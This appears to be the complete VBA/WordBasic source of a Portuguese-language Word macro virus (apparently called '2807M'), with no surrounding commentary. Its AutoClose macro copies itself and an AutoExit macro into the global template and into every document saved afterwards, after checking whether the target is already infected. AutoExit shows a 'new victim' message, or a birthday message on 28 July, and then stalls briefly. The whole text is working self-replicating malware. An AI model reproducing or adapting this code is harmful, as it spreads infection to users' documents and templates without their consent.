   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
       Infectar
   End Sub

   Private Sub Infectar()
   Dim Infectado
   Infectado = VerificaVitima(0)
   If Infectado = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExit", "Global:AutoExit"
   Else
       Infectado = VerificaVitima(1)
       If Infectado = 0 Then
           WordBasic.FileSaveAs Format:=1
           WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
           WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit"
       End If
   End If
   End Sub

   Private Function VerificaVitima(Contexto)
   Dim QtdadeMacros
   Dim Infectado
   Dim MAP0997
   Dim i
       QtdadeMacros = WordBasic.CountMacros(Contexto)
       Infectado = 0
       MAP0997 = 0
       If QtdadeMacros > 0 Then
           For i = 1 To QtdadeMacros
               If WordBasic.[MacroName$](i, Contexto) = "AutoClose" Or MAP0997 = 1 Then
                   MAP0997 = 1
                   If WordBasic.[MacroName$](i, Contexto) = "AutoExit" Then
                       Infectado = 1
                   End If
               End If
           Next
       End If
       VerificaVitima = Infectado
   End Function

   Attribute VB_Name = "AutoExit"

   Public Sub MAIN()
       Mensagem
   End Sub

   Private Sub Mensagem()
   Dim Atraso
   Dim fim
       If (WordBasic.Day(WordBasic.Now()) = 28 And WordBasic.Month(WordBasic.Now()) = 7) Then
           WordBasic.MsgBox "Parabéns para mim! ", "Meu aniversário", -8
           Atraso = 3
       Else
           WordBasic.MsgBox "Fechando 2807M! ", "Nova Vítima", -8
           Atraso = 1
       End If
       fim = WordBasic.Second(WordBasic.Now()) + 1
       While WordBasic.Second(WordBasic.Now()) <> fim
       Wend
   End Sub
